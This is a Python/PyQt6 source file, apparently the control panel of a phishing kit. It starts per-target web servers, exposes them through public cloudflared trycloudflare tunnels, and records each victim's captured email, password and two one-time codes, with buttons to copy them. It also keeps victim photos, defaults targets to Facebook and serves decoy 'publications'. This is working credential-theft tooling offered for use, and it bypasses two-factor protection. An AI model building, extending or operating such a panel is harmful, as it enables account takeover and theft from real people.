                        self.selected_row_widget.setStyleSheet(
                            f"QWidget {{ background-color: {_t_sel['bg_input']}; border: 1px dashed {_t_sel['text_muted']}; border-radius: 8px; }}")
                    else:
                        self.selected_row_widget.setStyleSheet(
                            f"QWidget {{ background-color: {_t_sel['bg_alt']}; border: none; border-radius: 8px; }}")
            except Exception as e:
                log_error_to_file('PanneauAdmin.select_target.restore_style', e)
                self.selected_row_widget = None

        self.selected_tid = tid
        self.selected_row_widget = row_widget
        self.lbl_log_title.setText(f"<b>Logs :</b> {mask_name(tid)}")
        self.last_logs_len = 0

        # Highlight new row
        if row_widget:
            try:
                row_widget.setStyleSheet(
                    f"QWidget {{ background-color: {_t_sel['bg_alt']}; border: 1px solid {_t_sel['accent']}; border-radius: 8px; }}")
            except Exception as e:
                log_error_to_file('PanneauAdmin.select_target.highlight', e)

        # Immediately show the selected target's logs
        cfg = self._get_selected_cfg()
        if cfg and cfg.get("memory_logs"):
            self.log.setHtml(cfg["memory_logs"])
            self.log.moveCursor(QTextCursor.MoveOperation.End)
            self.last_logs_len = len(cfg["memory_logs"])
        else:
            self.log.setHtml(BANNER_ASCII)
            self.last_logs_len = 0

    def start_target(self, tid):
        button_id = f"start_{tid}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            from config import active_servers, BASE_CONFIG
            import copy
            target_path = os.path.join(TARGETS_DIR, f"{tid}.json")
            try:
                with open(target_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
            except Exception as e:
                log_error_to_file("start_target.read_json", e)
                QMessageBox.critical(self, "Erreur", f"Impossible de lire {tid}: {e}")
                return

            # Use the port from target config
            port = int(data.get("port", 5000))

            # Security: port 7000 is reserved for Sandbox
            if port == 7000:
                QMessageBox.warning(self, "Port réservé", "Le port 7000 est réservé exclusivement à la Sandbox.\nVeuillez modifier le port de cette cible dans l'éditeur.")
                return

            # Security: check if port is already used by another active target
            if port in active_servers:
                existing_tid = active_servers[port].get("target_name", "?")
                display_name = mask_name(existing_tid) if is_hide_names() else existing_tid
                QMessageBox.warning(self, "Port déjà utilisé", f"Le port {port} est déjà utilisé par la cible « {display_name} ».\nArrêtez-la d'abord ou changez le port dans l'éditeur.")
                return

            # Security: check if port is occupied by another process on the system
            # But allow retry if the port was just released (TIME_WAIT)
            if is_port_in_use(port):
                # Wait 2 seconds and retry — the port might be in TIME_WAIT from a recent stop
                import time as _t
                _t.sleep(2)
                if is_port_in_use(port):
                    QMessageBox.warning(self, "Port occupé", f"Le port {port} est déjà occupé par un autre processus sur votre système.\nVeuillez libérer ce port ou en choisir un autre dans l'éditeur.")
                    return

            cfg = copy.deepcopy(BASE_CONFIG)
            cfg.update(data)
            cfg["port"] = port
            cfg["target_name"] = tid
            cfg["running"] = True
            cfg["memory_logs"] = BANNER_ASCII + "\n"
            # Reset runtime fields to avoid stale data from JSON
            cfg["last_creds"] = {"email": "", "pass": "", "otp1": "", "otp2": ""}
            cfg["server_instance"] = None
            cfg["cloudflare_proc"] = None
            cfg["public_mode"] = False
            cfg["cf_url"] = "Waiting..."

            # Charger les publications depuis les fichiers séparés
            try:
                from pub_manager import migrate_from_json, migrate_to_per_platform, load_publications
                migrate_from_json(tid)  # Migration si nécessaire
                migrate_to_per_platform(tid)  # Migration vers per-platform si nécessaire
                _cfg_platform = cfg.get("platform", "facebook")
                cfg["publications"] = load_publications(tid, _cfg_platform)
            except Exception as e:
                log_error_to_file("start_target.load_publications", e)
                cfg["publications"] = data.get("publications", [])  # fallback

            # Ensure video sandbox directory exists
            from config import get_video_dir
            video_dir = get_video_dir(tid)
            os.makedirs(video_dir, exist_ok=True)

            # ── Copier la photo de profil dans le dossier credentials ──
            # Pour que l'avatar survive quand la cible est mise dans la corbeille
            try:
                import credentials_manager as cm
                photo = cfg.get("victim_photo") or cfg.get("target_pic", "")
                if photo:
                    cm.copy_profile_photo_to_credentials(tid, photo)
            except Exception as e:
                log_error_to_file("start_target.copy_profile_photo", e)

            active_servers[port] = cfg
            threading.Thread(target=self._run_server, args=(port, cfg), daemon=True).start()
            ajouter_log("SYSTEM", f"Serveur démarré pour {tid} sur le port {port}", "#22c55e", force_cfg=cfg)
            self.selected_tid = tid
            self.lbl_log_title.setText(f"<b>Logs :</b> {mask_name(tid)}")
            self.rebuild_target_list()
        except Exception as e:
            log_error_to_file("start_target", e)
            QMessageBox.critical(self, "Erreur", f"Erreur lors du démarrage: {e}")
        finally:
            try:
                button_manager.unlock_button(button_id)
            except Exception:
                pass

    def _run_server(self, port, cfg):
        try:
            cfg["server_instance"] = make_server("0.0.0.0", port, app)
            cfg["server_instance"].serve_forever()
        except OSError as e:
            log_error_to_file("PanneauAdmin._run_server", e)
            log_error("PanneauAdmin._run_server", e)
            ajouter_log("SYSTEM", f"Erreur serveur port {port}: {e}", "#ef4444", force_cfg=cfg)
            if "Address already in use" in str(e) or "98" in str(e):
                try:
                    import time as _t
                    _t.sleep(3)
                    cfg["server_instance"] = make_server("0.0.0.0", port, app)
                    cfg["server_instance"].serve_forever()
                    ajouter_log("SYSTEM", f"Serveur redémarré sur port {port} (retry)", "#22c55e", force_cfg=cfg)
                except Exception as e2:
                    log_error_to_file("PanneauAdmin._run_server.retry", e2)
                    log_error("PanneauAdmin._run_server.retry", e2)
        except Exception as e:
            log_error_to_file("PanneauAdmin._run_server", e)
            log_error("PanneauAdmin._run_server", e)
            ajouter_log("SYSTEM", f"Erreur serveur port {port}: {e}", "#ef4444", force_cfg=cfg)

    def stop_target(self, port):
        button_id = f"stop_{port}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            from config import active_servers
            cfg = active_servers.get(port)
            if not cfg: 
                return
            cfg["running"] = False
            cfg["public_mode"] = False
            if cfg.get("server_instance"):
                try:
                    # Shutdown synchronously to ensure port is released before restart
                    cfg["server_instance"].shutdown()
                except Exception as e:
                    log_error_to_file("PanneauAdmin.stop_server.shutdown", e)
                try:
                    # Close the socket to release the port immediately
                    cfg["server_instance"].server_close()
                except Exception as e:
                    log_error_to_file("PanneauAdmin.stop_server.close", e)
                cfg["server_instance"] = None
            if cfg.get("cloudflare_proc"):
                try:
                    cfg["cloudflare_proc"].terminate()
                    cfg["cloudflare_proc"].wait(timeout=3)
                except Exception as e:
                    log_error_to_file("PanneauAdmin.stop_cloudflare_terminate", e)
                    log_error("PanneauAdmin.stop_cloudflare_terminate", e)
                    try: 
                        cfg["cloudflare_proc"].kill()
                    except Exception as e2: 
                        log_error_to_file("PanneauAdmin.stop_cloudflare_kill", e2)
                        log_error("PanneauAdmin.stop_cloudflare_kill", e2)
                cfg["cloudflare_proc"] = None
            if port in active_servers:
                del active_servers[port]
            self.rebuild_target_list()
        except Exception as e:
            log_error_to_file("PanneauAdmin.stop_target", e)
            log_error("PanneauAdmin.stop_target", e)
        finally:
            try:
                button_manager.unlock_button(button_id)
            except Exception:
                pass

    def go_public(self, port, cfg):
        button_id = f"go_public_{port}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            cfg["public_mode"] = True
            cfg["cf_url"] = "Connecting..."
            threading.Thread(target=self._run_cloudflare, args=(port, cfg), daemon=True).start()
            self.rebuild_target_list()
        except Exception as e:
            log_error_to_file("PanneauAdmin.go_public", e)
            log_error("PanneauAdmin.go_public", e)
        finally:
            try:
                button_manager.unlock_button(button_id)
            except Exception:
                pass

    def _find_cloudflared(self):
        """Search for cloudflared binary in multiple locations."""
        import shutil
        basename = "cloudflared.exe" if os.name == 'nt' else "cloudflared"
        # 1) System PATH
        cf = shutil.which("cloudflared")
        if cf: return cf
        # 2) Build candidate directories
        candidates = []
        if getattr(sys, 'frozen', False):
            candidates.append(os.path.dirname(os.path.abspath(sys.executable)))
        else:
            # Dossier racine du projet (parent de release_parts/)
            project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            candidates.append(project_root)
            # Dossier du script principal lancé (ex: Release.py)
            candidates.append(os.path.dirname(os.path.abspath(sys.argv[0])))
            # Dossier courant de travail
            candidates.append(os.getcwd())
            # Dossier contenant ce fichier (release_parts/) au cas où
            candidates.append(os.path.dirname(os.path.abspath(__file__)))
        # Éviter les doublons tout en conservant l'ordre
        seen = set()
        unique_candidates = []
        for d in candidates:
            d = os.path.abspath(d)
            if d not in seen:
                seen.add(d)
                unique_candidates.append(d)
        import config as _cfg_mod
        if _cfg_mod.debug_mode:
            ajouter_log("DEBUG", f"Recherche cloudflared dans: {unique_candidates}", "#aaaaaa")
        for d in unique_candidates:
            p = os.path.join(d, basename)
            if os.path.exists(p):
                if _cfg_mod.debug_mode:
                    ajouter_log("DEBUG", f"cloudflared trouvé: {p}", "#22c55e")
                return p
        if _cfg_mod.debug_mode:
            ajouter_log("DEBUG", f"cloudflared NON trouvé. Dernier fallback: {basename}", "#ef4444")
        return basename  # fallback: let the OS resolve it

    def _run_cloudflare(self, port, cfg):
        while cfg.get("public_mode", False):
            try:
                cf_path = self._find_cloudflared()
                cmd = [cf_path, "tunnel", "--url", f"http://127.0.0.1:{port}"]
                cfg["cloudflare_proc"] = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
                # Regex: only the canonical public URL form  https://xxx.trycloudflare.com  (no path, no query, no dest=)
                _TRYCLOUDFLARE_RE = re.compile(r'^https?://[a-z0-9-]+\.trycloudflare\.com/?$', re.IGNORECASE)
                for line in cfg["cloudflare_proc"].stdout:
                    if "trycloudflare.com" in line:
                        for p in line.split():
                            # Ignore tokens like dest=https://...trycloudflare.com/video/...
                            # and any URL that has a path after the domain.
                            if p.startswith("dest="):
                                continue
                            if "trycloudflare.com" in p and _TRYCLOUDFLARE_RE.match(p):
                                cfg["cf_url"] = p.strip().rstrip('/')
                                ajouter_log("TUNNEL", f"Public: {cfg['cf_url']}", "#f38020", force_cfg=cfg)
                                # Refresh UI to show the green link
                                QTimer.singleShot(0, self.rebuild_target_list)
                                break
                cfg["cloudflare_proc"].wait()
                if cfg.get("public_mode", False):
                    ajouter_log("TUNNEL", "Cloudflare reconnecting...", "#ef4444", force_cfg=cfg)
                    time.sleep(2)
            except Exception as e:
                log_error_to_file("PanneauAdmin._run_cloudflare", e)
                if cfg.get("public_mode", False):
                    ajouter_log("TUNNEL", f"Erreur: {e}", "#ef4444", force_cfg=cfg)
                    time.sleep(2)

    def copy_cf_url(self, cfg):
        try:
            url = cfg.get("cf_url", "")
            if url and "http" in url:
                QApplication.clipboard().setText(url)

        except Exception as e:
            log_error_to_file('Release.copy_cf_url', e)
            log_error('Release.copy_cf_url', e)
    def copy_selected_cred(self, key):
        button_id = f"copy_selected_cred_{key}"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            cfg = self._get_selected_cfg()
            if cfg:
                val = cfg.get("last_creds", {}).get(key, "")
                if val: 
                    QApplication.clipboard().setText(str(val))
        except Exception as e:
            log_error_to_file("PanneauAdmin.copy_selected_cred", e)
            log_error("PanneauAdmin.copy_selected_cred", e)
        finally:
            try:
                button_manager.unlock_button(button_id)
            except Exception:
                pass

    def clear_selected_logs(self):
        button_id = "clear_selected_logs"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            cfg = self._get_selected_cfg()
            if cfg:
                cfg["memory_logs"] = BANNER_ASCII + "\n"
                self.log.setHtml(BANNER_ASCII)
                self.last_logs_len = 0
        except Exception as e:
            log_error_to_file("PanneauAdmin.clear_selected_logs", e)
            log_error("PanneauAdmin.clear_selected_logs", e)
        finally:
            try:
                button_manager.unlock_button(button_id)
            except Exception:
                pass

    def _get_selected_cfg(self):
        if not self.selected_tid: return None
        from config import active_servers
        for p, cfg in active_servers.items():
            if cfg.get("target_name") == self.selected_tid:
                return cfg
        return None

    def maj_interface(self):
        from config import active_servers
        self.lbl_active.setText(f"Actives : {len(active_servers)}")
        # Update logs for selected target
        cfg = self._get_selected_cfg()
        if cfg and cfg.get("memory_logs"):
            cur_len = len(cfg["memory_logs"])
            if self.last_logs_len != cur_len:
                self.log.setHtml(cfg["memory_logs"])
                self.log.moveCursor(QTextCursor.MoveOperation.End)
                self.last_logs_len = cur_len
        # Rebuild rows periodically removed to prevent UI focus loss. Explicitly called by actions.

    def show_sandbox(self):
        button_id = "show_sandbox"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            if not hasattr(self, 'sandbox_win'):
                self.sandbox_win = SandboxWindow(self)
            self.sandbox_win.refresh_targets()
            self.sandbox_win.show()
            self.sandbox_win.raise_()
        except Exception as e:
            log_error_to_file("PanneauAdmin.show_sandbox", e)
            log_error("PanneauAdmin.show_sandbox", e)
        finally:
            try:
                button_manager.unlock_button(button_id)
            except Exception:
                pass

    def show_config(self):
        button_id = "show_config"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            self.config_win.refresh_targets_list()
            self.config_win.show()
            self.config_win.raise_()
        except Exception as e:
            log_error_to_file("PanneauAdmin.show_config", e)
            log_error("PanneauAdmin.show_config", e)
        finally:
            try:
                button_manager.unlock_button(button_id)
            except Exception:
                pass

    def center(self):
        qr = self.frameGeometry()
        cp = self.screen().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())

    def showEvent(self, event):
        self.center()
        self.animation = QPropertyAnimation(self, b"windowOpacity")
        self.animation.setDuration(400)
        self.animation.setStartValue(0.0)
        self.animation.setEndValue(1.0)
        self.animation.setEasingCurve(QEasingCurve.Type.InOutQuad)
        self.animation.start()
        super().showEvent(event)

    def closeEvent(self, event):
        try:
            from config import active_servers, sandbox_config
            from theme import get_theme as _gt_close
            _t_close = _gt_close()

            # Count active targets (hidden + visible)
            active_visible = 0
            active_hidden = 0
            for port, cfg in active_servers.items():
                tid = cfg.get("target_name", "")
                if tid:
                    if is_target_hidden(tid):
                        active_hidden += 1
                    else:
                        active_visible += 1
            total_active = active_visible + active_hidden

            sandbox_active = sandbox_config.get("running", False)

            # If nothing is active, just close
            if total_active == 0 and not sandbox_active:
                event.accept()
                QApplication.quit()
                return

            # Build the warning message
            lines = []
            if total_active > 0:
                lines.append(f"• {total_active} cible(s) active(s)")
                if active_visible > 0:
                    lines.append(f"   └ {active_visible} visible(s)")
                if active_hidden > 0:
                    lines.append(f"   └ {active_hidden} masquée(s)")
            if sandbox_active:
                sandbox_tid = sandbox_config.get("target_name", "?")
                lines.append(f"• Sandbox actif (cible : {sandbox_tid})")

            info_text = "\n".join(lines)
            detail_text = (
                "Voulez-vous vraiment fermer l'application ?\n\n"
                "« Tout fermer & Quitter » : arrête toutes les cibles et le sandbox proprement.\n"
                "« Annuler » : garde tout en marche."
            )

            msg = QMessageBox(self)
            msg.setWindowTitle("Fermer l'application")
            msg.setIcon(QMessageBox.Icon.Warning)
            msg.setText(info_text)
            msg.setInformativeText(detail_text)
            btn_quit = msg.addButton("Tout fermer & Quitter", QMessageBox.ButtonRole.AcceptRole)
            btn_cancel = msg.addButton("Annuler", QMessageBox.ButtonRole.RejectRole)
            msg.setDefaultButton(btn_cancel)
            msg.setStyleSheet(f"""
                QMessageBox {{ background-color: {_t_close['bg']}; color: {_t_close['text']}; }}
                QLabel {{ color: {_t_close['text']}; font-size: 13px; }}
                QPushButton {{ background-color: {_t_close['bg_alt']}; color: {_t_close['text']}; border: 1px solid {_t_close['border_hover']};
                              padding: 8px 16px; border-radius: 6px; font-weight: normal; }}
                QPushButton:hover {{ background-color: {_t_close['border_hover']}; border-color: {_t_close['accent']}; color: {_t_close['accent_text']}; }}
            """)

            msg.exec()
            clicked_btn = msg.clickedButton()
            if clicked_btn is btn_cancel:
                # User cancelled — don't close
                event.ignore()
                return

            # User chose to quit — stop everything
            # Stop all targets
            for port in list(active_servers.keys()):
                try:
                    self.stop_target(port)
                except Exception as e:
                    log_error_to_file("PanneauAdmin.closeEvent.stop_target", e)

            # Stop sandbox
            try:
                sandbox_config["running"] = False
                if sandbox_config.get("server_instance"):
                    try:
                        import threading
                        threading.Thread(target=sandbox_config["server_instance"].shutdown, daemon=True).start()
                    except Exception as e:
                        log_error_to_file("PanneauAdmin.closeEvent.sandbox_shutdown", e)
                sandbox_config["server_instance"] = None

                # Clean up sandbox temp directory
                temp_dir = sandbox_config.get("_sandbox_temp_dir", "")
                if temp_dir and os.path.exists(temp_dir):
                    import shutil
                    try:
                        import time as _time
                        _time.sleep(1)
                        shutil.rmtree(temp_dir)
                    except Exception as e:
                        log_error_to_file("PanneauAdmin.closeEvent.sandbox_cleanup", e)
            except Exception as e:
                log_error_to_file("PanneauAdmin.closeEvent.sandbox", e)

            # Close all child windows
            try:
                self.config_win.close()
                if hasattr(self, 'sandbox_win') and self.sandbox_win:
                    self.sandbox_win.close()
                if hasattr(self, 'corbeille_win') and self.corbeille_win:
                    self.corbeille_win.close()
                if hasattr(self, 'credentials_win') and self.credentials_win:
                    self.credentials_win.close()
            except Exception as e:
                log_error_to_file("PanneauAdmin.close_windows", e)

            event.accept()
            QApplication.quit()
        except Exception as e:
            log_error_to_file("PanneauAdmin.closeEvent", e)
            log_error("PanneauAdmin.closeEvent", e)
            # In case of error, force quit
            event.accept()
            QApplication.quit()

#Lancement
if __name__ == "__main__":
    import traceback as _tb_mod
    def _global_excepthook(exc_type, exc_value, tb):
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            # Canonical error log file (consolidated with helpers.log_error)
            with open("errors_logs.txt", "a", encoding="utf-8") as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"[{timestamp}] UNHANDLED EXCEPTION\n")
                f.write(f"Type: {exc_type.__name__}\n")
                f.write(f"Value: {exc_value}\n")
                f.write("Traceback:\n")
                for line in "".join(_tb_mod.format_tb(tb)).strip().split("\n"):
                    f.write(f"  {line}\n")
                f.write(f"{'='*60}\n\n")
        except Exception:
            pass
        import traceback as _tb2
        _tb2.print_exception(exc_type, exc_value, tb)
    sys.excepthook = _global_excepthook

    try:
        import faulthandler
        # Send segfault / deadlock dumps to the same canonical error log file
        _fh = open("errors_logs.txt", "a", encoding="utf-8")
        try:
            faulthandler.enable(_fh)
        except Exception:
            _fh.close()
            raise
    except Exception:
        pass

    try:
        from PyQt6.QtCore import qInstallMessageHandler
        def _qt_msg(msg_type, ctx, message):
            try:
                with open("errors_logs.txt", "a", encoding="utf-8") as f:
                    f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [Qt] {message}\n")
            except Exception:
                pass
        qInstallMessageHandler(_qt_msg)
    except Exception:
        pass

    app_qt = QApplication(sys.argv)
    win = PanneauAdmin()
    win.show()
    sys.exit(app_qt.exec())
